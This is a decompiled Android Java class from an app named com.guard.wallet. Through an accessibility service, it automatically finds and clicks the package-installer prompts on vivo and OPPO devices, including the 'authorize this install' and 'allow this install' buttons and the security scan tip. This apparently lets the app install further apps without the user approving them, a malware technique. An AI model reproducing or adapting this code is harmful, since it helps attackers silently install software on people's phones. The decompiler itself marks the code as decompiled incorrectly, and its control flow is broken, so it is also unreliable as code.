package p012o;

import android.util.Log;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.AbstractC0250f;
import com.guard.wallet.utils.AbstractC0251g;
import java.util.LinkedList;
import java.util.List;
import java.util.Objects;
import org.bouncycastle.i18n.TextBundle;
import p000a.AbstractC0000a;

/* renamed from: o.w */
/* loaded from: classes.dex */
public final /* synthetic */ class RunnableC0434w implements Runnable {

    /* renamed from: a */
    public final /* synthetic */ int f969a;

    /* renamed from: b */
    public final /* synthetic */ C0435x f970b;

    public /* synthetic */ RunnableC0434w(C0435x c0435x, int i2) {
        this.f969a = i2;
        this.f970b = c0435x;
    }

    /* JADX WARN: Removed duplicated region for block: B:13:0x00cd  */
    /* JADX WARN: Removed duplicated region for block: B:29:0x0160  */
    /* JADX WARN: Removed duplicated region for block: B:30:0x0163  */
    /* JADX WARN: Removed duplicated region for block: B:38:0x01a2  */
    /* JADX WARN: Removed duplicated region for block: B:39:0x01a8  */
    /* JADX WARN: Removed duplicated region for block: B:9:0x00c9  */
    @Override // java.lang.Runnable
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void run() {
        boolean z2;
        boolean z3;
        String str;
        int i2 = this.f969a;
        C0435x c0435x = this.f970b;
        switch (i2) {
            case 0:
                c0435x.m1169W();
                break;
            case 1:
                if (c0435x.m1164I()) {
                    Log.d("PackageInstallerDelegate", "vivo findCheckBoxAndClick Success");
                    AbstractC0251g.T0(25);
                }
                if (c0435x.m1165J()) {
                    Log.d("PackageInstallerDelegate", "vivo findContinueBtnAndClick Success");
                    AbstractC0251g.T0(10);
                    c0435x.m1167L();
                }
                c0435x.f972o.remove("commonInstallMatch");
                break;
            case 2:
                if (c0435x.m1164I()) {
                    Log.d("PackageInstallerDelegate", "findCheckBoxAndClick Success");
                    AbstractC0251g.T0(25);
                }
                if (c0435x.m1165J()) {
                    Log.d("PackageInstallerDelegate", "findContinueBtnAndClick Success");
                }
                c0435x.m1167L();
                c0435x.f972o.remove("commonInstallMatch");
                break;
            case 3:
                if (c0435x.m1165J()) {
                    Log.d("PackageInstallerDelegate", "dialogInstallMatch findContinueBtnAndClick Success");
                }
                c0435x.m1167L();
                break;
            case 4:
                if (c0435x.m1165J()) {
                    Log.d("PackageInstallerDelegate", "dialogInstallMatch findContinueBtnAndClick Success");
                }
                c0435x.m1167L();
                break;
            case 5:
                boolean z4 = true;
                if (c0435x.m1072k() != null) {
                    MyAccessibilityService.m548I(c0435x.m1072k());
                    UiObject m1072k = c0435x.m1072k();
                    CombineFiltersWithOr combineFiltersWithOr = new CombineFiltersWithOr();
                    combineFiltersWithOr.setFilters(new LinkedList());
                    List<CombineFilter> filters = combineFiltersWithOr.getFilters();
                    CombineFilter combineFilter = new CombineFilter();
                    combineFilter.setStringConditions(new LinkedList());
                    StringCondition stringCondition = new StringCondition();
                    stringCondition.setProperty(TextBundle.TEXT_ENTRY);
                    stringCondition.setPrefix(AbstractC0250f.m627b("OPPO_PREPARE_INSTALL_TEXT"));
                    combineFilter.getStringConditions().add(stringCondition);
                    filters.add(combineFilter);
                    List<CombineFilter> filters2 = combineFiltersWithOr.getFilters();
                    CombineFilter combineFilter2 = new CombineFilter();
                    combineFilter2.setStringConditions(new LinkedList());
                    StringCondition stringCondition2 = new StringCondition();
                    stringCondition2.setProperty(TextBundle.TEXT_ENTRY);
                    stringCondition2.setPrefix(AbstractC0250f.m627b("OPPO_PARSE_APP_TEXT"));
                    combineFilter2.getStringConditions().add(stringCondition2);
                    filters2.add(combineFilter2);
                    List<CombineFilter> filters3 = combineFiltersWithOr.getFilters();
                    CombineFilter combineFilter3 = new CombineFilter();
                    combineFilter3.setStringConditions(new LinkedList());
                    StringCondition stringCondition3 = new StringCondition();
                    stringCondition3.setProperty(TextBundle.TEXT_ENTRY);
                    stringCondition3.setPrefix(AbstractC0250f.m627b("OPPO_SCAN_APP_TEXT"));
                    combineFilter3.getStringConditions().add(stringCondition3);
                    filters3.add(combineFilter3);
                    if (m1072k.findOneByOperateOr(combineFiltersWithOr) != null) {
                        Log.d("PackageInstallerDelegate", "准备安装节点查找成功");
                        z2 = true;
                        if (!z2) {
                            str = "oplusInstallMatch isPrepareInstall Success";
                        } else if (c0435x.m1168O()) {
                            str = "oplusInstallMatch isInstalling Success";
                        } else {
                            AbstractC0251g.T0(10);
                            if (c0435x.m1164I()) {
                                Log.d("PackageInstallerDelegate", "oplusInstallMatch findCheckBoxAndClick Success");
                            }
                            if (c0435x.m1072k() != null) {
                                Log.d("PackageInstallerDelegate", "开始查找授权安装按钮");
                                MyAccessibilityService.m548I(c0435x.m1072k());
                                UiObject findOneByOperateOr = c0435x.m1072k().findOneByOperateOr(C0435x.m1155M());
                                if (findOneByOperateOr != null) {
                                    Log.d("PackageInstallerDelegate", "授权安装查找成功");
                                    if (findOneByOperateOr.text().endsWith("授权本次安装") && !Objects.equals(findOneByOperateOr.text(), "授权本次安装")) {
                                        Log.d("PackageInstallerDelegate", "授权本次安装查找成功");
                                        z3 = findOneByOperateOr.clickPosition(0.8f, 0.5f);
                                    } else if (findOneByOperateOr.text().endsWith("允许本次安装") && !Objects.equals(findOneByOperateOr.text(), "允许本次安装")) {
                                        Log.d("PackageInstallerDelegate", "允许本次安装查找成功");
                                        z3 = findOneByOperateOr.clickPosition(0.8f, 0.8f);
                                    } else if (findOneByOperateOr.enabled() && findOneByOperateOr.click()) {
                                        z3 = true;
                                    }
                                    if (z3) {
                                        if (c0435x.m1072k() != null) {
                                            Log.d("PackageInstallerDelegate", "开始查找扫描按钮");
                                            MyAccessibilityService.m548I(c0435x.m1072k());
                                            UiObject m1072k2 = c0435x.m1072k();
                                            CombineFilter combineFilter4 = new CombineFilter();
                                            combineFilter4.getStringConditions().add(AbstractC0000a.m7c(combineFilter4, "id", "com.oplus.appdetail:id/tv_scan_tips"));
                                            UiObject findOneByCombine = m1072k2.findOneByCombine(combineFilter4);
                                            if (findOneByCombine != null && findOneByCombine.click()) {
                                                Log.d("PackageInstallerDelegate", "扫描按钮点击完成");
                                                if (z4) {
                                                    if (c0435x.m1166K()) {
                                                        Log.d("PackageInstallerDelegate", "oplusInstallMatch findOplusDoneBtnAndClick Success");
                                                    }
                                                    c0435x.m1167L();
                                                    break;
                                                } else {
                                                    str = "oplusInstallMatch findOplusRegionInstallAndClick Success";
                                                }
                                            }
                                        }
                                        z4 = false;
                                        if (z4) {
                                        }
                                    } else {
                                        str = "oplusInstallMatch findOplusInstallBtnAndClick Success";
                                    }
                                }
                            }
                            z3 = false;
                            if (z3) {
                            }
                        }
                        Log.d("PackageInstallerDelegate", str);
                        break;
                    }
                }
                z2 = false;
                if (!z2) {
                }
                Log.d("PackageInstallerDelegate", str);
                break;
            default:
                if (!c0435x.m1168O()) {
                    if (c0435x.m1166K()) {
                        Log.d("PackageInstallerDelegate", "oplusInstallDoneMatch findOplusDoneBtnAndClick Success");
                    }
                    c0435x.m1167L();
                    break;
                } else {
                    Log.d("PackageInstallerDelegate", "oplusInstallDoneMatch isInstalling Success");
                    break;
                }
        }
    }
}
